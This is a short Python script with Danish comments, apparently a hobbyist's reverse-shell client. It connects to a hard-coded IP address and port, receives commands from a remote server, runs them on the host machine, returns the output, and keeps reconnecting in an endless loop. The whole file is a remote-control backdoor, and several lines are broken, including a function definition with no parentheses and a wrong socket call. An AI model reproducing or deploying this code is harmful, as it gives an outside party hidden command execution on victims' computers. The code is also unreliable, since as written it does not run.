# Naar klienten koerer skal den forbinde sig til serveren
# Naar den er forbundet skal den vente paa en kommando fra serveren
# Naar den modtager en kommando fra serveren skal den koerer kommandoen
# Og sende resultatet tilbage til serveren
#======================================================================================================================

# bibloteker som er nodvendige 
import os #<---- tillader at tilgaa et system
import socket #<------ gor det muligt at lave en socket forbindelse
import subprocess #<---- goer det muligt at integrere shellkommandoer i mit script, mens jeg administrere input / output
import time
#======================================================================================================================

#lav socket
def socket_create():
	try:
		global host
		global port
		global sock
		host = '192.168.128.219'
		port = 9999
		sock = socket.socket()
	except socket.error as err_msg:
		print('Oprettelse af socket fejlede ' + str(err_msg))


#forbind til socket remotely

def socket_connect:
	try:
		global host
		global port
		global sock
		socket.connect(host,port)
	except socket.error as err_msg:
		print('Socket blev ikke forbundet korrekt: ' + str(err_msg))
		time.sleep(5)
		socket_connect()

def recieve_commands():
	while True:
		data = sock.recv(24000)
		if data[:2].decode('utf-8') == 'cd':
			try:
				os.chdir(data[3:].decode('utf-8'))
			except:
				pass
		if data[:].decode('utf-8') == 'quit':
			sock.close()
			break
		if len(data) > 0:
			try:
				cmd = subprocess.Popen(data[:].decode('utf-8'), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output_bytes = cmd.stdout.read() + cmd.stderr.read()
				output_string = str(output_bytes, 'utf-8')
				sock.send(str.encode(output_string + str(os.getcwd()) + '> ')) 
				print(output_string)
			except:
				output_string = 'Kommando blev ikke genkendt ' + '\n'
				sock.send(str.encode(output_string + str(os.getcwd()) + '> '))
				print(output_string)

	sock.close()			

def main():
	global sock
	try:
		socket_create()
		socket_connect()
		recieve_commands()
	except:
		print('Fejl in main metoden')
		time.sleep(5)
	sock.close()
	main()

main()




		





